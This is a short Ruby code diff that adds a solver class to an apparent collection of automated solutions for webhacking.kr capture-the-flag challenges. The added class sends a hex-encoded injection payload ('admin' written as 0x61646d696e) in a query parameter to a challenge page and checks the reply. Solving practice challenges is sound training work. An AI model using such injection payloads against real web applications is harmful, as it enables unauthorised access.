@@ -713,4 +713,21 @@ module WebhackingKR
       check(auth(password))
     end
   end
+
+  ##
+  # Challenge 61
+  class Challenge61 < ChallengeBase
+    CHALLENGE = 61
+
+    PATH = '/challenge/web-38/'
+    PARAM_ID = 'id'
+    PAYLOAD = "0x61646d696e id"
+
+    def exec
+      query = URI.encode_www_form(PARAM_ID => PAYLOAD)
+      log('Sending payload')
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
 end
